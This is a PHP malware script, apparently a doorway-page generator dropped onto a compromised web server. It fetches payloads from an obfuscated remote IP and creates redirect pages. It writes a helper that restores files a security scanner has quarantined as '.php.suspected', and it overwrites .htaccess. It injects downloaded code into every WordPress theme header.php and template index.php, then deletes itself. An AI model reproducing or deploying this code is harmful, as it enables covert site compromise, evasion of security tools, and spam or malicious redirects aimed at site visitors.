<?php

ob_start();

if (!$_POST[urls])
{
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!<br>
<form method=post>
<textarea name=urls cols=100 rows=10></textarea>
<br><input type=submit value=go></form>";
 exit;
}
$x1=1+1+1+1+1;
  $let = array ("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    
$foldername='';     
for ($ns=1;$ns<rand(5,5);$ns++)     
{     
$r = rand (0,count($let)-1);     
$foldername .= $let[$r];     
}  

mkdir($foldername, 0777);


for ($nnn=1;$nnn<10;$nnn++)
{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$x1.4$x1.79.1$x1/doorgen2018/tpl$nnn.html"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$result = curl_exec($ch); 
curl_close($ch);
$z = fopen("$foldername/tpl$nnn.html", "w");
fwrite($z, $result);
fclose($z);
}

if (file_exists("$foldername/tpl1.html")) echo "";
else 
{
	unlink("z1.php");
	exit;
}

$result = '<?php
ignore_user_abort();
set_time_limit(0);

$in = scandir(".");

foreach ($in as $inn)
{

if (strpos($inn, ".php.suspected"))
{
	$inn = explode(".", $inn);
	$inn = $inn[0];
	rename ($inn.".php.suspected", $inn.".php");
}

}



?>';

$z = fopen("$foldername/zzz.php", "w");
fwrite($z, $result);
fclose($z);

$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$x1.4$x1.79.1$x1/doorgen2018/z2.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$redirect = curl_exec($ch); 
curl_close($ch);

$currenturl = str_replace("z1.php", "", $_SERVER[HTTP_REFERER]).$foldername."/";

$urls = explode("\n", $_POST[urls]);
//echo "<textarea name=urls cols=100 rows=10>";
foreach ($urls as $url)
{
$u = chop($url);
$u = ucfirst($u);

$key = str_replace(" ", "+", $key);
  $let = array ("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    
$myname='';     
for ($ns=1;$ns<rand(6,6);$ns++)     
{     
$r = rand (0,count($let)-1);     
$myname .= $let[$r];     
}  
  
$out = fopen("$foldername/$myname.php", "w");
$redirect1 = str_replace("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", $u, $redirect);

fwrite($out, $redirect1);

fclose($out);


echo "$currenturl$myname.php\n";
         ob_flush();
         flush();

}
//echo "</textarea>";


	$outht = fopen(".htaccess", "w");
fwrite($outht, "# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
 
# END WordPress");
fclose($outht);

@unlink(sys_get_temp_dir());

$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$x1.4$x1.79.1$x1/doorgen2018/zzzcode.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$code = curl_exec($ch); 
curl_close($ch);

if (file_exists("wp-content"))
{
if (file_exists("wp-content/themes"))
{
	$dirs = scandir("wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir("wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
			if (file_exists("wp-content/themes/$dir/header.php")) 
			{
		   				  $file = fopen("wp-content/themes/".$dir."/header.php", "r");  
                          $buffer = fread($file, filesize("wp-content/themes/".$dir."/header.php")); 
                          fclose($file);	
               if (eregi('236.65.24', $buffer)==0) 
               { 
				 
						 	$in = fopen("wp-content/themes/".$dir."/header.php", "w");
				             fwrite($in, $code);
			                 fwrite($in, $buffer);
				             fclose($in);
				/*		 
                   $in = fopen("wp-content/themes/$dir/header.php", "a");
				   fwrite($in, $code);
				   fclose($in);
				   */
               }
			}
		}
	}
}
}

if (file_exists("templates"))
{
	 $dirs = scandir("templates");
	 	foreach ($dirs as $dir)
	     {
		         if ((is_dir("templates/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		          {
					  if (file_exists("templates/".$dir."/index.php")) 
					  {
						  $file = fopen("templates/".$dir."/index.php", "r");  
                          $buffer = fread($file, filesize("templates/".$dir."/index.php")); 
                          fclose($file);	
                            if (eregi('236.65.24', $buffer)==0) 
                                   {
					         $in = fopen("templates/".$dir."/index.php", "w");
				             fwrite($in, $code);
			                 fwrite($in, $buffer);
				             fclose($in);
 								   }									   
					  }
		          }
	     }
}
unlink("z1.php");
?>